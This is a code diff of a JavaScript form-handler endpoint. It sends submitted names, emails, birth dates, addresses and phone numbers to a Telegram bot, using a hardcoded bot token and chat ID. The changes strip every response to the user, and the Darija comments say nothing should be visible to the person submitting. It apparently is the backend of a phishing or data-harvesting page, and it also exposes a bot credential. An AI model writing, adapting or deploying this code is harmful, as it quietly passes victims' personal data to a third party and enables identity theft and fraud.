@@ -1,20 +1,22 @@
+import fetch from "node-fetch";
+
 export default async function handler(req, res) {
   if (req.method !== "POST") {
-    return res.status(405).json({ message: "Method not allowed" });
+    return res.status(405).end(); // ما يبانش أي حاجة للمستخدم
   }
 
   const { first_name, last_name, email, dob, address, postal, city, num } = req.body;
 
-  const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM"; // حط هنا token ديالك
-  const CHAT_ID = "-4982276528"; // حط هنا chat ID ديالك
+  const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM"; // token ديالك
+  const CHAT_ID = "-4982276528"; // chat ID ديالك
 
   const message = `
 📨 بيانات جديدة:
-- الاسم: ${first_name} ${last_name}
-- البريد: ${email}
-- تاريخ الميلاد: ${dob}
-- العنوان: ${address}, ${city}, ${postal}
-- رقم الهاتف: ${num}
+- nome: ${first_name} ${last_name}
+- email: ${email}
+- date : ${dob}
+- address: ${address}, ${city}, ${postal}
+- num : ${num}
   `;
 
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -26,9 +28,10 @@ export default async function handler(req, res) {
       body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
     });
 
-    res.status(200).json({ message: "تم الإرسال بنجاح!" });
+    // ما كاينش response للمستخدم
+    return res.status(200).end();
   } catch (err) {
-    console.error(err);
-    res.status(500).json({ message: "خطأ أثناء الإرسال" });
+    console.error(err); // غادي يبقى في console فقط
+    return res.status(500).end(); // ما يبانش الخطأ للمستخدم
   }
 }
